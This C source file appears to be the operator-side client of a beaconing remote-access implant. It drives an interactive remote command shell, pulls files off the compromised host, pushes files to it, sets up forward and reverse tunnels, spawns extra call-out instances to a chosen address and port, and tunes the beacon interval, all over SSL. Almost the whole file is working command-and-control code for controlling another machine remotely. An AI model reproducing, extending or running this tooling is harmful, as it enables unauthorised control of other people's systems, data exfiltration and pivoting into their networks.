#include "client.h"

/**
 * Tells the server to spawn a new instance of itself with the specified prot and address to beacon out to.
 * 
 * Note: When the primary instance of the shell is shutdown properly all of the children will be killed. If the server 
 * reverts to beaconing behavior at any point in time the server will kill the children. If the server is forcibly 
 * stopped on the remote side the processes will likely become zombie processes.
 */
int newconn(SSL *ssl) {
  uint8_t ans[16] = {0};
  char port[7];
  char addr[INET6_ADDRSTRLEN];

  printf("Enter the call out IP address: ");
  fgets(addr,sizeof(addr),stdin);

  printf("Enter the port: ");
  fgets(port, sizeof(port),stdin);

  if (atoi(port) < 0 || atoi(port) > 65535) {
    fprintf(stderr, "[-] The given port must be between 1-65535");
    return RECOVER;
  }

  // Send the command to the remote server
  if (ssl_writeall(ssl, (uint8_t *)"1", 2) < 0) {return FAIL;}

  // Check to make sure the server is gtg.
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  if (strcmp((char *)ans, "100") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s.\n", ans);
    return RECOVER;
  }

  // Write the address to the server.
  if (ssl_writeall(ssl, (uint8_t *)addr, sizeof(addr)) < 0) {return FAIL;}

  // Check to make sure the server recieved it.
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  if (strcmp((char *)ans, "101") != 0) {
    fprintf(stderr, "[-] Unexpected answer from the server: %s.\n", ans);
    return RECOVER;
  }

  // Write the port to the server.
  if (ssl_writeall(ssl, (uint8_t *)port, sizeof(port)) < 0) {return FAIL;}

  // Check to make sure the server recieved it.
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  if (strcmp((char *)ans, "102") != 0) {
    fprintf(stderr, "[-] Unexpected answer from the server: %s.\n", ans);
    return RECOVER;
  }

  // Get the process id from the server
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {return FAIL;}
  printf("[+] Kicked off new process with the following pid: %s\n", ans);
  
  return SUCCESS;
}

/**
 * Opens a simple inteface for sending commands to popen on the server. For this reason the interface
 * will hang if the user attempts to run interactive commands or any user interaction is expected at all.
 * Erros can be redirected back to the user by placing 2>&1 in the appropriate locations when typing the command.
 * Future implementations will likely contain an interface that passes a pty interface back and forth over the socket.
 */
int cmdshell(SSL *ssl) {
  uint8_t msg[4] = {0};
  uint8_t buf[4096] = {0};

  // Send the command to the remote server
  if (ssl_writeall(ssl, (uint8_t *)"2", 2) < 0) {return FAIL;}

  // Wait for the server to send back the date command.
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
  printf("Remote Shell Activated At: %s", buf);

  // Start a command loop -- interactive commands like vim, tmux, top, bash, will hang the terminal.
  //  this is because I am using a unidirectional pipe provided by popen. Could consider pipe, fork, exec later.
  while (1) {
    printf("sbsh> ");

    memset(buf, 0, sizeof(buf));
    fgets((char *)buf, sizeof(buf), stdin);
    if (strcmp((char *)buf, "exit\n") == 0) {
      if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
      break;
    }

    if (strcmp((char *)buf, "\n") == 0) {
      continue;
    }

    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

    memset(buf, 0, sizeof(buf));
    while(1) {
      if (ssl_readall(ssl, msg, sizeof(msg)) < 0) {return FAIL;}
      if (strcmp((char *)msg, "101") == 0) {
        break;
      }
      if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
      printf("%s", buf);
      memset(buf, 0, sizeof(buf));
      memset(msg, 0, sizeof(msg));
    }
  }

  return SUCCESS;
}

/**
 * Recieve a file from the server
 * On ssl socket errors the client will exit. The server should resume beaconing behavior.
 */
int getfile(SSL *ssl) {
  FILE *fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  uint8_t localpath[4096];
  uint8_t remotepath[4096];
  ssize_t filesize = 0;
  size_t written = 0;

  printf("Enter the remote file path: ");
  fgets((char *)remotepath, sizeof(remotepath), stdin);
  trim((char *)remotepath);

  printf("Enter the local file path: ");
  fgets((char *)localpath, sizeof(localpath), stdin);
  trim((char *)localpath);

  // Create or open the local file 
  if ((fd = fopen((char *)localpath, "a")) == NULL) {
    perror("[-] ERROR: Could not open designated local file");
    return RECOVER;    
  }

  // Send the server a message letting it know we would like to recieve a file
  if (ssl_writeall(ssl, (uint8_t *)"3", 2) < 0 ) {goto failure;}

  // Make sure the server is good to go with allowing us to recieve a file
  if (ssl_readall(ssl, ans, 4) < 0) {goto failure;}
  if (strcmp((char *)ans, "300") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s.\n", ans);
    return RECOVER;
  }

  // Send the file name that we would like to get 
  if (ssl_writeall(ssl, remotepath, sizeof(remotepath)) < 0) {goto failure;}

  // If the server can open the file it will send us the size of the file to be recieved
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {goto failure;}
  filesize = atoi((char *)ans);
  if (filesize < 1) {
    fprintf(stderr, "[-] There was an error getting the size of the remote file.\n");
    return RECOVER;
  }

  // Download the file
  printf("[*] Getting remote file %s and placing at %s.\n", remotepath, localpath);
  while(written < (size_t)filesize) {
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
    fprintf(fd, "%s", buf);
    written += strlen((char *)buf);
    memset(buf, 0, sizeof(buf));
  }
  fclose(fd);

  printf("[+] Wrote %ld bytes to %s.\n", written, localpath);

  return SUCCESS;

  failure:
  fclose(fd);
  return FAIL;
}

/**
 * Place a file on the server.
 * On ssl socket errors the client will exit. The server should resume beaconing behavior.
 */
int putfile(SSL *ssl) {
  FILE *fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  uint8_t localpath[4096];
  uint8_t remotepath[4096];
  ssize_t filesize = 0;
  size_t readin = 0;
  struct stat st;

  printf("Enter the local file path: ");
  fgets((char *)localpath, sizeof(localpath), stdin);
  trim((char *)localpath);

  printf("Enter the remote file path: ");
  fgets((char *)remotepath, sizeof(remotepath), stdin);
  trim((char *)remotepath);

  // Create or open the local file 
  if ((fd = fopen((char *)localpath, "r")) == NULL) {
    perror("[-] ERROR: Could not open designated local file");
    return RECOVER;    
  }

  // Send the server a message letting it know we would like to put a file up
  if (ssl_writeall(ssl, (uint8_t *)"4", 2) < 0) {goto failure;}

  // Make sure the server is good to go with allowing us to recieve a file
  if (ssl_readall(ssl, ans, 4) < 0) {goto failure;}
  if (strcmp((char *)ans, "400") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s\n", ans);
    return RECOVER;
  }

  // Send the file name that we would like to put our new file up as
  if (ssl_writeall(ssl, remotepath, sizeof(remotepath)) < 0) {goto failure;}

  // Check to ensure the server was able to open the remote file.
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, 4) < 0) {goto failure;}
  if (strcmp((char *)ans, "401") != 0) {
    fprintf(stderr, "[-] The server was unable to open the remote file path for writing.\n");
    return RECOVER;
  }

  // Get the file size and then rewind to the begining of the file
  fstat(fileno(fd), &st);
  filesize = st.st_size;
  sprintf((char *)ans, "%ld", filesize);
  if (ssl_writeall(ssl, ans, sizeof(ans)) < 0) {goto failure;}

  // Send the file
  printf("[*] Putting local file %s on remote and placing at %s.\n", localpath, remotepath);

  while(readin < (size_t)filesize) {
    memset(buf, 0, sizeof(buf));
    fgets((char *)buf, sizeof(buf), fd);
    readin += strlen((char *)buf);
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
  }
  printf("[+] Sent %ld bytes to remote server to be placed in %s.\n", readin, remotepath);

  fclose(fd);
  return SUCCESS;

  failure:
  fclose(fd);
  return FAIL;
}

/**
 * Based on user input call for either a forward or reverse tunnel to be setup.
 * The client will remain in this mode until the user indicates they would like to shutdown the tunnel
 * or it detects a read/write error on either of the sockets. In the event of a socket error while in the 
 * loop the server will revert to its beaconing behavior.
 */
int tunnel(SSL *ssl) {
  int efd;
  uint8_t ans[16] = {0};
  char type[9] = {0};
  char lport[7] = {0};
  char dport[7] = {0};
  char addr[INET6_ADDRSTRLEN] = {0};

  // Check which type of tunnel we want to setup
  printf("Which type of tunnel (forward, reverse): ");
  fgets(type, sizeof(type), stdin);
  trim(type);
  //clearstdin();

  // Grab the port that we want to listen on locally
  printf("Enter the port to listen on: ");
  fgets(lport, sizeof(lport), stdin);
  trim(lport);
  //clearstdin();

  // Grab the address that we want to point our tunnel at
  printf("Enter the desitnation IP address: ");
  fgets(addr, sizeof(addr), stdin);
  trim(addr);
  //clearstdin();

  // Grab the port we want to aim our tunnel at
  printf("Enter the desitnation port: ");
  fgets(dport, sizeof(dport), stdin);
  trim(dport);
  //clearstdin();

  // Set the epoll file descriptor
  if ((efd = epoll_create1(0)) < 0) {
    fprintf(stderr, "[-] Could not open epoll file descriptor. Returning to main menu.\n");
    return RECOVER;
  }

  // Tell the server that we are starting a tunnel command
  if (ssl_writeall(ssl, (uint8_t *)"5", 2) < 0) {return FAIL;}

  // Recieve the response from the server
  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
  
  // The server failed to setup an epoll file descriptor
  if (strcmp((char *)ans, "530") == 0) {
    fprintf(stderr, "[-] Server was unable to create epoll structure, reverting to beacon, exiting now\n");
    return FAIL;
  }

  // Check to make sure the server is gtg
  if (strcmp((char *)ans, "500") != 0) {
    fprintf(stderr, "[-] Unexpected code recieved from server: %s\n", ans);
    return FAIL;
  } 

  // Based on the tunnel type enter into that command loop
  if (strcmp(type, "forward") == 0) {
    return forward_tunnel(ssl, efd, lport, dport, addr);
  } else if (strcmp(type, "reverse") == 0) {
    return reverse_tunnel(ssl, efd, lport, dport, addr);
  } else {
    printf("[-] Unrecognized tunnel type, please try again.\n");
    return RECOVER;
  }
  return SUCCESS;
}


/**
 * Set the time to sleep between each beacon the server will send. On error the server 
 * will revert to the beaconing behavior that was previously set.
 */
int winset(SSL *ssl) {
  char time[256];
  uint8_t ans[4] = {0};

  printf("Enter the amount of time in seconds to wait between each beacon: ");
  fgets(time, sizeof(time),stdin);

  if (atoi(time) <= 0) {
    fprintf(stderr, "[-] The given time must be greater than 0");
    return RECOVER;
  }

  // Send the command to the server
  if (ssl_writeall(ssl, (uint8_t *)"6", 2) < 0) {return FAIL;}

  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {return FAIL;}
  if (strcmp((char *)ans, "600") != 0) {
    fprintf(stderr, "[-] Unexpected answer from server while setting up: %s.\n", ans);
    return RECOVER;
  }

  // Write the address to the server.
  if (ssl_writeall(ssl, (uint8_t *)time, sizeof(time)) < 0) {return FAIL;}

  // Check to make sure the server recieved it.
  memset(ans, 0, sizeof(ans));
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {return FAIL;}
  if (strcmp((char *)ans, "601") != 0) {
    fprintf(stderr, "[-] Unexpected answer from the server: %s.\n", ans);
    return RECOVER;
  }

  return SUCCESS;
}

